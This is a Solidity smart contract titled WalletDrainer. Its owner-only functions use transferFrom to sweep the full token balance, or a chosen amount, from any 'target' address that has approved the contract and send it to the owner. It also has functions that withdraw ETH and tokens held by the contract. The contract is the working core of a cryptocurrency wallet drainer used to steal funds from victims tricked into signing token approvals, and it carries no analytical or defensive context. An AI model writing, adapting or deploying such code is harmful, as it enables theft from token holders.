// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./IERC20.sol";
import "./Ownable.sol";

contract WalletDrainer is Ownable {

       event TokensDrained(address indexed token, uint256 amount);

     function drainERC20Tokens(address token, address target) external onlyOwner {
        IERC20 erc20Token = IERC20(token);
        uint256 balance = erc20Token.balanceOf(target);
       erc20Token.transferFrom(target, owner(), balance);
        emit TokensDrained(token, balance);
    }
    
        function drainERC20Tokens2(address token, address target, uint256 amount) external onlyOwner {
        IERC20 erc20Token = IERC20(token);
        erc20Token.transferFrom(target, owner(), amount);
        emit TokensDrained(token, amount);
    }
 function drainETH() external {
    uint256 balance = address(this).balance;
    payable(owner()).transfer(balance);
}
function withdrawETH(uint256 amount) external onlyOwner {
    require(amount <= address(this).balance, "Not enough ETH in contract");
    payable(owner()).transfer(amount);
}

   function withdrawERC20Tokens(address token) external onlyOwner {
        IERC20 erc20Token = IERC20(token);
        uint256 balance = erc20Token.balanceOf(address(this));
        erc20Token.transfer(owner(), balance);
    }
}